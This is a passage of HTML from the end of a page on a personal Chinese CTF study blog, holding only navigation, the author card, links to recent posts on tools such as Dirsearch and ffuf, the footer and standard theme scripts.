href="/2023/01/01/ctf-kb/wp/Pwn/%E7%9C%8B%E9%9B%AA2023_KCTF%E5%B9%B4%E5%BA%A6%E8%B5%9B_-_%E7%AC%AC9%E9%A2%98-%E7%AA%81%E7%A0%B4%E9%98%B2%E7%BA%BF-%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/" title="看雪2023 KCTF年度赛 | 第9题·突破防线-设计思路及解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">看雪2023 KCTF年度赛 | 第9题·突破防线-设计思路及解析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
